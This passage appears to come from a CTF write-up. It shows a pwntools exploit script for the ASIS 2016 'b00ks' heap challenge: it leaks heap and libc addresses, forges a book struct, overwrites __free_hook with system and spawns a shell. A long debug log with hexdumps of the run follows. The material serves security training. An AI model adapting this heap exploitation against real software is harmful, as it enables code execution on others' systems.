class="line">log.info(p.recvuntil(<span class="string">"&gt; "</span>))</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Name: "</span>)</span><br><span class="line">mmap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="comment"># p.recvuntil("Exit")</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+]mmap_addr:"</span>,hex(mmap_addr)</span><br><span class="line"><span class="keyword">return</span> mmap_addr</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./b00ks"</span>)</span><br><span class="line">mmap_offset = <span class="number">0x1ca010</span></span><br><span class="line"><span class="comment"># mmap_offset = 0x1eb000</span></span><br><span class="line">g_offset = <span class="number">0x202040</span></span><br><span class="line">libc = ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("./libc-2.24.so")</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"><span class="comment"># 1.leak book1 heap addr</span></span><br><span class="line">p.recvuntil(<span class="string">"Enter author name: "</span>)</span><br><span class="line">p.sendline(<span class="string">"A"</span> * <span class="number">0x20</span>)</span><br><span class="line">create_book(p, <span class="number">20</span>, <span class="string">"book1"</span>, <span class="number">220</span>, <span class="string">"book1 des"</span>)</span><br><span class="line"><span class="comment"># 2.find fake1 addr and offset</span></span><br><span class="line">book1_addr = leak_book1(p)</span><br><span class="line">fake_addr = book1_addr - ord(p64(book1_addr)[<span class="number">0</span>])</span><br><span class="line">padding_size = <span class="number">0x110</span> - ord(p64(book1_addr)[<span class="number">0</span>]) - <span class="number">0x20</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] fake_addr:"</span>,hex(fake_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] padding size:"</span>,hex(padding_size)</span><br><span class="line"><span class="comment"># 3.create book2 with 0x21000 book description</span></span><br><span class="line">create_book(p,<span class="number">20</span>,<span class="string">"/bin/sh\x00"</span>,<span class="number">0x21000</span>,<span class="string">"book2 des"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.fake book1</span></span><br><span class="line">book2_addr = book1_addr + <span class="number">0x30</span> + <span class="number">0x20</span></span><br><span class="line">payload1 = <span class="string">"0"</span>*padding_size + p64(<span class="number">1</span>) + p64(book2_addr + <span class="number">0x10</span>) + p64(book2_addr + <span class="number">0x10</span>) + pack(<span class="number">0xffff</span>)</span><br><span class="line">edit_book(p,<span class="number">1</span>,payload1)</span><br><span class="line">change_author(p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.leak mmap addr</span></span><br><span class="line">mmap_addr = leak_mmap(p)</span><br><span class="line">libc_base = mmap_addr - mmap_offset</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">binsh_addr = libc_base + next(libc.search(<span class="string">"/bin/sh\x00"</span>))</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system addr:"</span>,hex(system_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"binsh addr:"</span>,hex(binsh_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"__free_hook:"</span>,hex(free_hook)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6.overwrite __free_hook</span></span><br><span class="line">payload2 = p64(free_hook)</span><br><span class="line">payload3 = p64(system_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+]overwrite free hook"</span></span><br><span class="line"><span class="keyword">print</span> proc.pidof(p)[<span class="number">0</span>]</span><br><span class="line">edit_book(p,<span class="number">1</span>,payload2)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">edit_book(p,<span class="number">2</span>,payload3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7.exec shell</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Enter the book id you want to delete: "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$python ./b00ks_pwn.py DEBUG</span><br><span class="line">[+] Starting local process <span class="string">'./b00ks'</span>: pid <span class="number">5215</span></span><br><span class="line">[DEBUG] PLT <span class="number">0x22050</span> realloc</span><br><span class="line">[DEBUG] PLT <span class="number">0x22090</span> __tls_get_addr</span><br><span class="line">[DEBUG] PLT <span class="number">0x220d0</span> memalign</span><br><span class="line">[DEBUG] PLT <span class="number">0x220e0</span> _dl_exception_create</span><br><span class="line">[DEBUG] PLT <span class="number">0x22120</span> __tunable_get_val</span><br><span class="line">[DEBUG] PLT <span class="number">0x221d0</span> _dl_find_dso_for_object</span><br><span class="line">[DEBUG] PLT <span class="number">0x22210</span> calloc</span><br><span class="line">[DEBUG] PLT <span class="number">0x222f0</span> malloc</span><br><span class="line">[DEBUG] PLT <span class="number">0x222f8</span> free</span><br><span class="line">[*] <span class="string">'/media/sf_workplace/CTF/asis2016/b00ks/libc-2.27.so'</span></span><br><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">[DEBUG] Received <span class="number">0x33</span> bytes:</span><br><span class="line"><span class="string">'Welcome to ASISCTF book library\n'</span></span><br><span class="line"><span class="string">'Enter author name: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x21</span> bytes:</span><br><span class="line"><span class="string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x6f</span> bytes:</span><br><span class="line"><span class="string">'\n'</span></span><br><span class="line"><span class="string">'1. Create a book\n'</span></span><br><span class="line"><span class="string">'2. Delete a book\n'</span></span><br><span class="line"><span class="string">'3. Edit a book\n'</span></span><br><span class="line"><span class="string">'4. Print book detail\n'</span></span><br><span class="line"><span class="string">'5. Change current author name\n'</span></span><br><span class="line"><span class="string">'6. Exit\n'</span></span><br><span class="line"><span class="string">'&gt; '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'1\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x17</span> bytes:</span><br><span class="line"><span class="string">'\n'</span></span><br><span class="line"><span class="string">'Enter book name size: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> bytes:</span><br><span class="line"><span class="string">'20\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x20</span> bytes:</span><br><span class="line"><span class="string">'Enter book name (Max 32 chars): '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x6</span> bytes:</span><br><span class="line"><span class="string">'book1\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x1e</span> bytes:</span><br><span class="line"><span class="string">'\n'</span></span><br><span class="line"><span class="string">'Enter book description size: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x4</span> bytes:</span><br><span class="line"><span class="string">'220\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x18</span> bytes:</span><br><span class="line"><span class="string">'Enter book description: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0xa</span> bytes:</span><br><span class="line"><span class="string">'book1 des\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x6f</span> bytes:</span><br><span class="line"><span class="string">'\n'</span></span><br><span class="line"><span class="string">'1. Create a book\n'</span></span><br><span class="line"><span class="string">'2. Delete a book\n'</span></span><br><span class="line"><span class="string">'3. Edit a book\n'</span></span><br><span class="line"><span class="string">'4. Print book detail\n'</span></span><br><span class="line"><span class="string">'5. Change current author name\n'</span></span><br><span class="line"><span class="string">'6. Exit\n'</span></span><br><span class="line"><span class="string">'&gt; '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'4\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0xc7</span> bytes:</span><br><span class="line"><span class="number">00000000</span>  <span class="number">49</span> <span class="number">44</span> <span class="number">3</span>a <span class="number">20</span>  <span class="number">31</span> <span class="number">0</span>a <span class="number">4</span>e <span class="number">61</span>  <span class="number">6</span>d <span class="number">65</span> <span class="number">3</span>a <span class="number">20</span>  <span class="number">62</span> <span class="number">6</span>f <span class="number">6</span>f <span class="number">6</span>b  |ID: |<span class="number">1</span>·Na|me: |book|</span><br><span class="line"><span class="number">00000010</span>  <span class="number">31</span> <span class="number">0</span>a <span class="number">44</span> <span class="number">65</span>  <span class="number">73</span> <span class="number">63</span> <span class="number">72</span> <span class="number">69</span>  <span class="number">70</span> <span class="number">74</span> <span class="number">69</span> <span class="number">6</span>f  <span class="number">6</span>e <span class="number">3</span>a <span class="number">20</span> <span class="number">62</span>  |<span class="number">1</span>·De|scri|ptio|n: b|</span><br><span class="line"><span class="number">00000020</span>  <span class="number">6</span>f <span class="number">6</span>f <span class="number">6</span>b <span class="number">31</span>  <span class="number">20</span> <span class="number">64</span> <span class="number">65</span> <span class="number">73</span>  <span class="number">0</span>a <span class="number">41</span> <span class="number">75</span> <span class="number">74</span>  <span class="number">68</span> <span class="number">6</span>f <span class="number">72</span> <span class="number">3</span>a  |ook1| des|·Aut|hor:|</span><br><span class="line"><span class="number">00000030</span>  <span class="number">20</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  | AAA|AAAA|AAAA|AAAA|</span><br><span class="line"><span class="number">00000040</span>  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  |AAAA|AAAA|AAAA|AAAA|</span><br><span class="line"><span class="number">00000050</span>  <span class="number">41</span> <span class="number">80</span> <span class="number">83</span> <span class="number">75</span>  <span class="number">55</span> <span class="number">55</span> <span class="number">55</span> <span class="number">0</span>a  <span class="number">0</span>a <span class="number">31</span> <span class="number">2</span>e <span class="number">20</span>  <span class="number">43</span> <span class="number">72</span> <span class="number">65</span> <span class="number">61</span>  |A··u|UUU·|·<span class="number">1.</span> |Crea|</span><br><span class="line"><span class="number">00000060</span>  <span class="number">74</span> <span class="number">65</span> <span class="number">20</span> <span class="number">61</span>  <span class="number">20</span> <span class="number">62</span> <span class="number">6</span>f <span class="number">6</span>f  <span class="number">6</span>b <span class="number">0</span>a <span class="number">32</span> <span class="number">2</span>e  <span class="number">20</span> <span class="number">44</span> <span class="number">65</span> <span class="number">6</span>c  |te a| boo|k·<span class="number">2.</span>| Del|</span><br><span class="line"><span class="number">00000070</span>  <span class="number">65</span> <span class="number">74</span> <span class="number">65</span> <span class="number">20</span>  <span class="number">61</span> <span class="number">20</span> <span class="number">62</span> <span class="number">6</span>f  <span class="number">6</span>f <span class="number">6</span>b <span class="number">0</span>a <span class="number">33</span>  <span class="number">2</span>e <span class="number">20</span> <span class="number">45</span> <span class="number">64</span>  |ete |a bo|ok·<span class="number">3</span>|. Ed|</span><br><span class="line"><span class="number">00000080</span>  <span class="number">69</span> <span class="number">74</span> <span class="number">20</span> <span class="number">61</span>  <span class="number">20</span> <span class="number">62</span> <span class="number">6</span>f <span class="number">6</span>f  <span class="number">6</span>b <span class="number">0</span>a <span class="number">34</span> <span class="number">2</span>e  <span class="number">20</span> <span class="number">50</span> <span class="number">72</span> <span class="number">69</span>  |it a| boo|k·<span class="number">4.</span>| Pri|</span><br><span class="line"><span class="number">00000090</span>  <span class="number">6</span>e <span class="number">74</span> <span class="number">20</span> <span class="number">62</span>  <span class="number">6</span>f <span class="number">6</span>f <span class="number">6</span>b <span class="number">20</span>  <span class="number">64</span> <span class="number">65</span> <span class="number">74</span> <span class="number">61</span>  <span class="number">69</span> <span class="number">6</span>c <span class="number">0</span>a <span class="number">35</span>  |nt b|ook |deta|il·<span class="number">5</span>|</span><br><span class="line"><span class="number">000000</span>a0  <span class="number">2</span>e <span class="number">20</span> <span class="number">43</span> <span class="number">68</span>  <span class="number">61</span> <span class="number">6</span>e <span class="number">67</span> <span class="number">65</span>  <span class="number">20</span> <span class="number">63</span> <span class="number">75</span> <span class="number">72</span>  <span class="number">72</span> <span class="number">65</span> <span class="number">6</span>e <span class="number">74</span>  |. Ch|ange| cur|rent|</span><br><span class="line"><span class="number">000000</span>b0  <span class="number">20</span> <span class="number">61</span> <span class="number">75</span> <span class="number">74</span>  <span class="number">68</span> <span class="number">6</span>f <span class="number">72</span> <span class="number">20</span>  <span class="number">6</span>e <span class="number">61</span> <span class="number">6</span>d <span class="number">65</span>  <span class="number">0</span>a <span class="number">36</span> <span class="number">2</span>e <span class="number">20</span>  | aut|hor |name|·<span class="number">6.</span> |</span><br><span class="line"><span class="number">000000</span>c0  <span class="number">45</span> <span class="number">78</span> <span class="number">69</span> <span class="number">74</span>  <span class="number">0</span>a <span class="number">3</span>e <span class="number">20</span>                               |Exit|·&gt; |</span><br><span class="line"><span class="number">000000</span>c7</span><br><span class="line">[+] Leaked address of book1 struct object : <span class="number">0x555555758380</span></span><br><span class="line">[+] fake_addr: <span class="number">0x555555758300</span></span><br><span class="line">[+] padding size: <span class="number">0x70</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'1\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x17</span> bytes:</span><br><span class="line"><span class="string">'\n'</span></span><br><span class="line"><span class="string">'Enter book name size: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> bytes:</span><br><span class="line"><span class="string">'20\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x20</span> bytes:</span><br><span class="line"><span class="string">'Enter book name (Max 32 chars): '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x9</span> bytes:</span><br><span class="line"><span class="number">00000000</span>  <span class="number">2</span>f <span class="number">62</span> <span class="number">69</span> <span class="number">6</span>e  <span class="number">2</span>f <span class="number">73</span> <span class="number">68</span> <span class="number">00</span>  <span class="number">0</span>a                        |/bin|/sh·|·|</span><br><span class="line"><span class="number">00000009</span></span><br><span class="line">[DEBUG] Received <span class="number">0x1e</span> bytes:</span><br><span class="line"><span class="string">'\n'</span></span><br><span class="line"><span class="string">'Enter book description size: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x7</span> bytes:</span><br><span class="line"><span class="string">'135168\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x18</span> bytes:</span><br><span class="line"><span class="string">'Enter book description: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0xa</span> bytes:</span><br><span class="line"><span class="string">'book2 des\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x6f</span> bytes:</span><br><span class="line"><span class="string">'\n'</span></span><br><span class="line"><span class="string">'1. Create a book\n'</span></span><br><span class="line"><span class="string">'2. Delete a book\n'</span></span><br><span class="line"><span class="string">'3. Edit a book\n'</span></span><br><span class="line"><span class="string">'4. Print book detail\n'</span></span><br><span class="line"><span class="string">'5. Change current author name\n'</span></span><br><span class="line"><span class="string">'6. Exit\n'</span></span><br><span class="line"><span class="string">'&gt; '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'3\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x24</span> bytes:</span><br><span class="line"><span class="string">'Enter the book id you want to edit: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'1\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x1c</span> bytes:</span><br><span class="line"><span class="string">'Enter new book description: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x8f</span> bytes:</span><br><span class="line"><span class="number">00000000</span>  <span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span>  <span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span>  <span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span>  <span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span>  |<span class="number">0000</span>|<span class="number">0000</span>|<span class="number">0000</span>|<span class="number">0000</span>|</span><br><span class="line">*</span><br><span class="line"><span class="number">00000070</span>  <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  e0 <span class="number">83</span> <span class="number">75</span> <span class="number">55</span>  <span class="number">55</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>  |····|····|··uU|UU··|</span><br><span class="line"><span class="number">00000080</span>  e0 <span class="number">83</span> <span class="number">75</span> <span class="number">55</span>  <span class="number">55</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>  ff ff <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">0</span>a     |··uU|UU··|····|···|</span><br><span class="line"><span class="number">0000008</span>f</span><br><span class="line">[DEBUG] Received <span class="number">0x6f</span> bytes:</span><br><span class="line"><span class="string">'\n'</span></span><br><span class="line"><span class="string">'1. Create a book\n'</span></span><br><span class="line"><span class="string">'2. Delete a book\n'</span></span><br><span class="line"><span class="string">'3. Edit a book\n'</span></span><br><span class="line"><span class="string">'4. Print book detail\n'</span></span><br><span class="line"><span class="string">'5. Change current author name\n'</span></span><br><span class="line"><span class="string">'6. Exit\n'</span></span><br><span class="line"><span class="string">'&gt; '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'5\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x13</span> bytes:</span><br><span class="line"><span class="string">'Enter author name: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x21</span> bytes:</span><br><span class="line"><span class="string">'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'</span></span><br><span class="line">[*] [+] Leak mmap-libc offset</span><br><span class="line">[DEBUG] Received <span class="number">0x6f</span> bytes:</span><br><span class="line"><span class="string">'\n'</span></span><br><span class="line"><span class="string">'1. Create a book\n'</span></span><br><span class="line"><span class="string">'2. Delete a book\n'</span></span><br><span class="line"><span class="string">'3. Edit a book\n'</span></span><br><span class="line"><span class="string">'4. Print book detail\n'</span></span><br><span class="line"><span class="string">'5. Change current author name\n'</span></span><br><span class="line"><span class="string">'6. Exit\n'</span></span><br><span class="line"><span class="string">'&gt; '</span></span><br><span class="line">[*] </span><br><span class="line"><span class="number">1.</span> Create a book</span><br><span class="line"><span class="number">2.</span> Delete a book</span><br><span class="line"><span class="number">3.</span> Edit a book</span><br><span class="line"><span class="number">4.</span> Print book detail</span><br><span class="line"><span class="number">5.</span> Change current author name</span><br><span class="line"><span class="number">6.</span> Exit</span><br><span class="line">&gt; </span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'4\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x113</span> bytes:</span><br><span class="line"><span class="number">00000000</span>  <span class="number">49</span> <span class="number">44</span> <span class="number">3</span>a <span class="number">20</span>  <span class="number">31</span> <span class="number">0</span>a <span class="number">4</span>e <span class="number">61</span>  <span class="number">6</span>d <span class="number">65</span> <span class="number">3</span>a <span class="number">20</span>  <span class="number">10</span> e0 fa f7  |ID: |<span class="number">1</span>·Na|me: |····|</span><br><span class="line"><span class="number">00000010</span>  ff <span class="number">7</span>f <span class="number">0</span>a <span class="number">44</span>  <span class="number">65</span> <span class="number">73</span> <span class="number">63</span> <span class="number">72</span>  <span class="number">69</span> <span class="number">70</span> <span class="number">74</span> <span class="number">69</span>  <span class="number">6</span>f <span class="number">6</span>e <span class="number">3</span>a <span class="number">20</span>  |···D|escr|ipti|on: |</span><br><span class="line"><span class="number">00000020</span>  <span class="number">10</span> e0 fa f7  ff <span class="number">7</span>f <span class="number">0</span>a <span class="number">41</span>  <span class="number">75</span> <span class="number">74</span> <span class="number">68</span> <span class="number">6</span>f  <span class="number">72</span> <span class="number">3</span>a <span class="number">20</span> <span class="number">61</span>  |····|···A|utho|r: a|</span><br><span class="line"><span class="number">00000030</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  |aaaa|aaaa|aaaa|aaaa|</span><br><span class="line"><span class="number">00000040</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">0</span>a  |aaaa|aaaa|aaaa|aaa·|</span><br><span class="line"><span class="number">00000050</span>  <span class="number">49</span> <span class="number">44</span> <span class="number">3</span>a <span class="number">20</span>  <span class="number">32</span> <span class="number">0</span>a <span class="number">4</span>e <span class="number">61</span>  <span class="number">6</span>d <span class="number">65</span> <span class="number">3</span>a <span class="number">20</span>  <span class="number">2</span>f <span class="number">62</span> <span class="number">69</span> <span class="number">6</span>e  |ID: |<span class="number">2</span>·Na|me: |/bin|</span><br><span class="line"><span class="number">00000060</span>  <span class="number">2</span>f <span class="number">73</span> <span class="number">68</span> <span class="number">0</span>a  <span class="number">44</span> <span class="number">65</span> <span class="number">73</span> <span class="number">63</span>  <span class="number">72</span> <span class="number">69</span> <span class="number">70</span> <span class="number">74</span>  <span class="number">69</span> <span class="number">6</span>f <span class="number">6</span>e <span class="number">3</span>a  |/sh·|Desc|ript|ion:|</span><br><span class="line"><span class="number">00000070</span>  <span class="number">20</span> <span class="number">62</span> <span class="number">6</span>f <span class="number">6</span>f  <span class="number">6</span>b <span class="number">32</span> <span class="number">20</span> <span class="number">64</span>  <span class="number">65</span> <span class="number">73</span> <span class="number">0</span>a <span class="number">41</span>  <span class="number">75</span> <span class="number">74</span> <span class="number">68</span> <span class="number">6</span>f  | boo|k2 d|es·A|utho|</span><br><span class="line"><span class="number">00000080</span>  <span class="number">72</span> <span class="number">3</span>a <span class="number">20</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  |r: a|aaaa|aaaa|aaaa|</span><br><span class="line"><span class="number">00000090</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  |aaaa|aaaa|aaaa|aaaa|</span><br><span class="line"><span class="number">000000</span>a0  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">0</span>a  <span class="number">0</span>a <span class="number">31</span> <span class="number">2</span>e <span class="number">20</span>  <span class="number">43</span> <span class="number">72</span> <span class="number">65</span> <span class="number">61</span>  <span class="number">74</span> <span class="number">65</span> <span class="number">20</span> <span class="number">61</span>  |aaa·|·<span class="number">1.</span> |Crea|te a|</span><br><span class="line"><span class="number">000000</span>b0  <span class="number">20</span> <span class="number">62</span> <span class="number">6</span>f <span class="number">6</span>f  <span class="number">6</span>b <span class="number">0</span>a <span class="number">32</span> <span class="number">2</span>e  <span class="number">20</span> <span class="number">44</span> <span class="number">65</span> <span class="number">6</span>c  <span class="number">65</span> <span class="number">74</span> <span class="number">65</span> <span class="number">20</span>  | boo|k·<span class="number">2.</span>| Del|ete |</span><br><span class="line"><span class="number">000000</span>c0  <span class="number">61</span> <span class="number">20</span> <span class="number">62</span> <span class="number">6</span>f  <span class="number">6</span>f <span class="number">6</span>b <span class="number">0</span>a <span class="number">33</span>  <span class="number">2</span>e <span class="number">20</span> <span class="number">45</span> <span class="number">64</span>  <span class="number">69</span> <span class="number">74</span> <span class="number">20</span> <span class="number">61</span>  |a bo|ok·<span class="number">3</span>|. Ed|it a|</span><br><span class="line"><span class="number">000000</span>d0  <span class="number">20</span> <span class="number">62</span> <span class="number">6</span>f <span class="number">6</span>f  <span class="number">6</span>b <span class="number">0</span>a <span class="number">34</span> <span class="number">2</span>e  <span class="number">20</span> <span class="number">50</span> <span class="number">72</span> <span class="number">69</span>  <span class="number">6</span>e <span class="number">74</span> <span class="number">20</span> <span class="number">62</span>  | boo|k·<span class="number">4.</span>| Pri|nt b|</span><br><span class="line"><span class="number">000000e0</span>  <span class="number">6</span>f <span class="number">6</span>f <span class="number">6</span>b <span class="number">20</span>  <span class="number">64</span> <span class="number">65</span> <span class="number">74</span> <span class="number">61</span>  <span class="number">69</span> <span class="number">6</span>c <span class="number">0</span>a <span class="number">35</span>  <span class="number">2</span>e <span class="number">20</span> <span class="number">43</span> <span class="number">68</span>  |ook |deta|il·<span class="number">5</span>|. Ch|</span><br><span class="line"><span class="number">000000</span>f0  <span class="number">61</span> <span class="number">6</span>e <span class="number">67</span> <span class="number">65</span>  <span class="number">20</span> <span class="number">63</span> <span class="number">75</span> <span class="number">72</span>  <span class="number">72</span> <span class="number">65</span> <span class="number">6</span>e <span class="number">74</span>  <span class="number">20</span> <span class="number">61</span> <span class="number">75</span> <span class="number">74</span>  |ange| cur|rent| aut|</span><br><span class="line"><span class="number">00000100</span>  <span class="number">68</span> <span class="number">6</span>f <span class="number">72</span> <span class="number">20</span>  <span class="number">6</span>e <span class="number">61</span> <span class="number">6</span>d <span class="number">65</span>  <span class="number">0</span>a <span class="number">36</span> <span class="number">2</span>e <span class="number">20</span>  <span class="number">45</span> <span class="number">78</span> <span class="number">69</span> <span class="number">74</span>  |hor |name|·<span class="number">6.</span> |Exit|</span><br><span class="line"><span class="number">00000110</span>  <span class="number">0</span>a <span class="number">3</span>e <span class="number">20</span>                                            |·&gt; |</span><br><span class="line"><span class="number">00000113</span></span><br><span class="line">[+]mmap_addr: <span class="number">0x7ffff7fae010</span></span><br><span class="line">system addr: <span class="number">0x7ffff7e275d0</span></span><br><span class="line">binsh addr: <span class="number">0x7ffff7f63573</span></span><br><span class="line">__free_hook: <span class="number">0x7ffff7f9d8e8</span></span><br><span class="line">[+]overwrite free hook</span><br><span class="line"><span class="number">5215</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'3\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x24</span> bytes:</span><br><span class="line"><span class="string">'Enter the book id you want to edit: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'1\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x1c</span> bytes:</span><br><span class="line"><span class="string">'Enter new book description: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x9</span> bytes:</span><br><span class="line"><span class="number">00000000</span>  e8 d8 f9 f7  ff <span class="number">7</span>f <span class="number">00</span> <span class="number">00</span>  <span class="number">0</span>a                        |····|····|·|</span><br><span class="line"><span class="number">00000009</span></span><br><span class="line">[DEBUG] Received <span class="number">0x6f</span> bytes:</span><br><span class="line"><span class="string">'\n'</span></span><br><span class="line"><span class="string">'1. Create a book\n'</span></span><br><span class="line"><span class="string">'2. Delete a book\n'</span></span><br><span class="line"><span class="string">'3. Edit a book\n'</span></span><br><span class="line"><span class="string">'4. Print book detail\n'</span></span><br><span class="line"><span class="string">'5. Change current author name\n'</span></span><br><span class="line"><span class="string">'6. Exit\n'</span></span><br><span class="line"><span class="string">'&gt; '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'3\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x24</span> bytes:</span><br><span class="line"><span class="string">'Enter the book id you want to edit: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'2\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x1c</span> bytes:</span><br><span class="line"><span class="string">'Enter new book description: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x9</span> bytes:</span><br><span class="line"><span class="number">00000000</span>  d0 <span class="number">75</span> e2 f7  ff <span class="number">7</span>f <span class="number">00</span> <span class="number">00</span>  <span class="number">0</span>a                        |·u··|····|·|</span><br><span class="line"><span class="number">00000009</span></span><br><span class="line">[DEBUG] Received <span class="number">0x6f</span> bytes:</span><br><span class="line"><span class="string">'\n'</span></span><br><span class="line"><span class="string">'1. Create a book\n'</span></span><br><span class="line"><span class="string">'2. Delete a book\n'</span></span><br><span class="line"><span class="string">'3. Edit a book\n'</span></span><br><span class="line"><span class="string">'4. Print book detail\n'</span></span><br><span class="line"><span class="string">'5. Change current author name\n'</span></span><br><span 